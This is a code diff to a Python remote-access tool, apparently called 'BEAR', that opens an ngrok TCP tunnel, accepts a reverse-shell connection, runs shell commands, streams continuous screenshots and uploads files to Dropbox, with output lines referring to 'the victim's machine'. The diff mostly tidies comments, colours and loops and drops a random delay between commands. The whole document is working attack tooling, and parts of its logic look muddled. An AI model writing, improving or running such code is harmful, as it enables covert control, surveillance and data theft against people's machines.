@@ -3,7 +3,6 @@
 import subprocess
 import sys
 import time
-import threading
 import socket
 import base64
 import os
@@ -14,8 +13,9 @@ import shutil
 import requests
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
-import pickle  # Added pickle module for session saving
+import pickle
 
+# ANSI color codes for formatted output
 BLUE = '\033[94m'
 GREEN = '\033[92m'
 RED = '\033[91m'
@@ -58,7 +58,7 @@ def get_attacker_info():
 def encrypt_access_token(token):
     key = input("[+] Enter your AES key (must be 16, 24, or 32 bytes long): ").encode()
     if len(key) not in [16, 24, 32]:
-        print("[*] Invalid key length. AES key must be 16, 24, or 32 bytes long.")
+        print(RED + "[*] Invalid key length. AES key must be 16, 24, or 32 bytes long." + RESET)
         sys.exit(1)
     cipher = AES.new(key, AES.MODE_ECB)
     token_padded = pad(token.encode(), AES.block_size)
@@ -79,7 +79,7 @@ def load_session():
 
 # Main function
 def main():
-    # Check if there is a saved session
+    # Load any saved sessions
     sessions = load_session()
 
     # Get attacker info if no saved session
@@ -88,8 +88,8 @@ def main():
         ip = get_attacker_info()
         port = input("[+] Enter the port number for the reverse shell and ngrok: ")
     else:
-        session_id = input("[*] Do you want to continue a saved session? (yes/no): ")
-        if session_id.lower() == "yes":
+        session_choice = input("[*] Do you want to continue a saved session? (yes/no): ")
+        if session_choice.lower() == "yes":
             print("[*] Available sessions:")
             for session_id, session_info in sessions.items():
                 print(f"Session ID: {session_id}, IP: {session_info['ip']}, Port: {session_info['port']}")
@@ -102,13 +102,13 @@ def main():
             port = input("[+] Enter the port number for the reverse shell and ngrok: ")
 
     print(GREEN + "[*] Starting ngrok tunnel..." + RESET)
-    # Update to use ngrok tcp command with the port specified by the attacker
+    # Start ngrok tunnel
     ngrok_process = subprocess.Popen(['ngrok', 'tcp', port])
-    time.sleep(3)  # Give ngrok some time to establish the tunnel
+    time.sleep(3)  # Allow ngrok to establish the tunnel
 
     access_token_encrypted = encrypt_access_token(access_token)
 
-    # Define headers for Dropbox API
+    # Dropbox API headers
     headers = {
         "Authorization": f"Bearer {access_token_encrypted}",
         "Content-Type": "application/octet-stream",
@@ -119,43 +119,48 @@ def main():
         "Accept-Language": "en-US,en;q=0.9"
     }
 
-    # Create socket
+    # Setup socket for reverse shell
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind((ip, int(port)))  # Bind to the port specified by the attacker
+    s.bind((ip, int(port)))
     s.listen(1)
     print(YELLOW + "[!] Waiting for incoming connection..." + RESET)
     client_socket, addr = s.accept()
 
-    # Start shell
+    # Start shell and virtual display
     shell = subprocess.Popen(['/bin/bash', '-i'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-
-    # Start display
     display = Display(visible=0, size=(800, 600))
     display.start()
 
-    # Load sessions
+    # Load existing sessions or create new ones
     session_counter = max([int(session_id) for session_id in sessions.keys()], default=0) + 1
 
-    # Main loop
+    # Main command loop
     while True:
         command = input(RED + "[*] BEAR >> " + RESET)
         if command.lower() == "exit":
             break
-        
-        time.sleep(random.uniform(1, 5))
-        
+
         result = subprocess.run(command, shell=True, capture_output=True, text=True)
         stdout = result.stdout
         stderr = result.stderr
-        
-        client_socket.send(command.encode())
-        client_socket.send(stdout.encode())
-        client_socket.send(stderr.encode())
 
+        client_socket.send(command.encode())
+
+        if stdout:
+            print(GREEN + stdout + RESET)
+            print(GREEN + "[+] Command executed successfully!" + RESET)
+            client_socket.send(stdout.encode())
+        else:
+            print(RED + "[!] No output returned from the victim's machine." + RESET)
+
+        if stderr:
+            client_socket.send(stderr.encode())
+
+        # Handle additional commands like "screen", "upload", etc.
         if command.lower() == "screen":
             session_id = str(session_counter)
             session_counter += 1
-            sessions[session_id] = {"ip": ip, "port": port}  # Save session info
+            sessions[session_id] = {"ip": ip, "port": port}
             print(f"Started screen session {session_id}")
 
             screen = pyautogui.screenshot()
@@ -163,17 +168,15 @@ def main():
 
             client_socket.send(screen_data.encode())
 
-            while True:
-                try:
+            try:
+                while True:
                     screen = pyautogui.screenshot()
                     screen_data = base64.b64encode(screen.tobytes()).decode('utf-8')
-
                     client_socket.send(screen_data.encode())
-
                     time.sleep(0.1)
-                except KeyboardInterrupt:
-                    print("\nScreen session ended.")
-                    break
+            except KeyboardInterrupt:
+                print("\nScreen session ended.")
+                break
 
         elif command.lower() == "upload":
             file_path = input("Enter the path of the file to upload: ")
@@ -200,19 +203,13 @@ def main():
             response = requests.post(url, headers=headers, json=data)
             client_socket.send(response.text.encode())
 
-        else:
-            client_socket.send(stdout.encode())
-            client_socket.send(stderr.encode())
-    
-    # Save sessions
+    # Save the current session before exit
     save_session(sessions)
 
-    # Close sockets and display
+    # Close connections and clean up
     client_socket.close()
     s.close()
     display.stop()
-
-    # Terminate ngrok process
     ngrok_process.terminate()
 
 if __name__ == "__main__":
